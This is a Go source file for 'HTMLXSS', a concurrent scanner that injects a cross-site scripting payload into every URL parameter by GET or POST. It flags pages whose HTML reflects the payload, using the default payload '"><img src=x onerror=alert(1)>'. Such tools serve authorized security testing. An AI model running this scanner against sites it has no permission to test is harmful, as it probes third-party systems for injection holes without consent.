package main

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"flag"
	"fmt"
	"io/ioutil"
	"net"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strings"
	"sync"
	"time"
)

func init() {
	flag.Usage = func() {
		help := []string{
			"HTMLXSS",
			"",
			"Usage:",
			"+====================================================================================+",
			"|       -p, -payload,         Reflection Flag, see readme for more information",
			"|       -H, --headers,        Headers",
			"|       -c                    Set Concurrency, Default: 50",
			"|       -x, --proxy,          Send traffic to a proxy",
			"|       -s, --only-poc        Show only potentially vulnerable urls",
			"|       -o                    HTTP Method: get or post (Default: get)",
			"|       -h                    Show This Help Message",
			"|",
			"+====================================================================================+",
			"",
		}

		fmt.Println(`
HTMLXSS
`)
		fmt.Fprintf(os.Stderr, strings.Join(help, "\n"))
	}
}

type customheaders []string

func (m *customheaders) String() string {
	return "This message is for Setting Headers"
}

func (h *customheaders) Set(val string) error {
	*h = append(*h, val)
	return nil
}

var headers customheaders

func main() {
	var concurrency int
	flag.IntVar(&concurrency, "c", 50, "")

	var xsspayload string
	flag.StringVar(&xsspayload, "payload", "", "")
	flag.StringVar(&xsspayload, "p", "", "")

	var proxy string
	flag.StringVar(&proxy, "proxy", "0", "")
	flag.StringVar(&proxy, "x", "0", "")

	var poc bool
	flag.BoolVar(&poc, "only-poc", false, "")
	flag.BoolVar(&poc, "s", false, "")

	var method string
	flag.StringVar(&method, "o", "get", "HTTP method: get or post")

	flag.Var(&headers, "headers", "")
	flag.Var(&headers, "H", "")

	flag.Parse()

	var methods []string
	for _, m := range strings.Split(method, ",") {
		m = strings.ToLower(strings.TrimSpace(m))
		if m != "get" && m != "post" {
			fmt.Fprintf(os.Stderr, "[-] Método inválido: %s. Use -o get, -o post ou -o get,post\n", m)
			os.Exit(1)
		}
		methods = append(methods, m)
	}

	visto := make(map[string]bool)
	std := bufio.NewScanner(os.Stdin)
	targets := make(chan string)

	var wg sync.WaitGroup
	for i := 0; i < concurrency; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for v := range targets {
				for _, m := range methods {
					var output string
					if xsspayload != "" {
						output = xss(v, xsspayload, proxy, poc, m)
					} else {
						output = xssDefault(v, proxy, poc, m)
					}
					if output != "ERROR" {
						fmt.Println(output)
					}
				}
			}
		}()
	}

	for std.Scan() {
		line := std.Text()
		if !visto[line] {
			targets <- line
			visto[line] = true
		}
	}
	close(targets)
	wg.Wait()
}

func buildClient(proxy string) *http.Client {
	trans := &http.Transport{
		MaxIdleConns:      30,
		IdleConnTimeout:   time.Second,
		DisableKeepAlives: true,
		TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
		DialContext: (&net.Dialer{
			Timeout:   3 * time.Second,
			KeepAlive: time.Second,
		}).DialContext,
	}

	if proxy != "0" {
		if p, err := url.Parse(proxy); err == nil {
			trans.Proxy = http.ProxyURL(p)
		}
	}

	return &http.Client{
		Transport: trans,
		Timeout:   3 * time.Second,
	}
}

func applyHeaders(req *http.Request) {
	req.Header.Set("Connection", "close")
	for _, v := range headers {
		s := strings.SplitN(v, ":", 2)
		if len(s) == 2 {
			req.Header.Set(strings.TrimSpace(s[0]), strings.TrimSpace(s[1]))
		}
	}
}

func isHTMLResponse(resp *http.Response) bool {
	ct := resp.Header.Get("Content-Type")
	return strings.Contains(ct, "text/html")
}

// buildRequest monta o request GET ou POST injetando o payload nos parâmetros
func buildRequest(targetURL, payload, method string) (*http.Request, string, error) {
	u, err := url.Parse(targetURL)
	if err != nil {
		return nil, "", err
	}

	q, err := url.ParseQuery(u.RawQuery)
	if err != nil {
		return nil, "", err
	}

	// injeta payload em todos os params
	for key := range q {
		q.Set(key, payload)
	}

	// se não há params na URL, ainda tenta com o payload direto
	finalURL := targetURL

	if method == "post" {
		// POST: params no body, URL sem query string
		u.RawQuery = ""
		body := bytes.NewBufferString(q.Encode())
		req, err := http.NewRequest("POST", u.String(), body)
		if err != nil {
			return nil, "", err
		}
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		return req, u.String(), err
	}

	// GET: params na query string
	u.RawQuery = q.Encode()
	finalURL = u.String()
	req, err := http.NewRequest("GET", finalURL, nil)
	return req, finalURL, err
}

func xss(targetURL, payload, proxy string, onlyPOC bool, method string) string {
	client := buildClient(proxy)

	req, finalURL, err := buildRequest(targetURL, payload, method)
	if err != nil {
		return "ERROR"
	}
	applyHeaders(req)

	resp, err := client.Do(req)
	if err != nil {
		return "ERROR"
	}
	defer resp.Body.Close()

	if !isHTMLResponse(resp) {
		return "ERROR"
	}

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "ERROR"
	}

	quotedPayload := regexp.QuoteMeta(payload)
	match, _ := regexp.MatchString(quotedPayload, string(body))

	if onlyPOC {
		if match {
			return fmt.Sprintf("[%s] %s", strings.ToUpper(method), finalURL)
		}
		return "ERROR"
	}

	if match {
		return fmt.Sprintf("\033[1;31mVulnerable [%s] - %s\033[0;0m", strings.ToUpper(method), finalURL)
	}
	return fmt.Sprintf("\033[1;30mNot Vulnerable [%s] - %s\033[0;0m", strings.ToUpper(method), finalURL)
}

func xssDefault(targetURL, proxy string, onlyPOC bool, method string) string {
	client := buildClient(proxy)

	defaultPayload := `"><img src=x onerror=alert(1)>`

	req, finalURL, err := buildRequest(targetURL, defaultPayload, method)
	if err != nil {
		return "ERROR"
	}
	applyHeaders(req)

	resp, err := client.Do(req)
	if err != nil {
		return "ERROR"
	}
	defer resp.Body.Close()

	if !isHTMLResponse(resp) {
		return "ERROR"
	}

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "ERROR"
	}

	quotedPayload := regexp.QuoteMeta(defaultPayload)
	match, _ := regexp.MatchString(quotedPayload, string(body))

	if onlyPOC {
		if match {
			return fmt.Sprintf("[%s] %s", strings.ToUpper(method), finalURL)
		}
		return "ERROR"
	}

	if match {
		return fmt.Sprintf("\033[1;31mVulnerable [%s] - %s\033[0;0m", strings.ToUpper(method), finalURL)
	}
	return fmt.Sprintf("\033[1;30mNot Vulnerable [%s] - %s\033[0;0m", strings.ToUpper(method), finalURL)
}
